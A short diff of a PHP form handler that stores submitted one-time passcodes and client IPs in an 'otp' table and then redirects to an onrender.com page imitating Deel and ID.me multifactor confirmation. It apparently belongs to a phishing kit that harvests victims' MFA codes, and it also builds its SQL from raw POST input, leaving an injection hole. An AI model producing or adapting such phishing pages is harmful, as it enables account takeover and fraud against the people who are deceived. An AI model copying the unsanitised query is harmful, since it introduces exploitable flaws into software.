@@ -7,7 +7,7 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otp (userotp,time,ip) VALUES ('$_POST[userotp]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
 
- header("Location:https://deel-20f2.onrender.com/Deel.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
+ header("Location:https://deel-com.onrender.com/Deel.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
 exit;
 }
 ?>
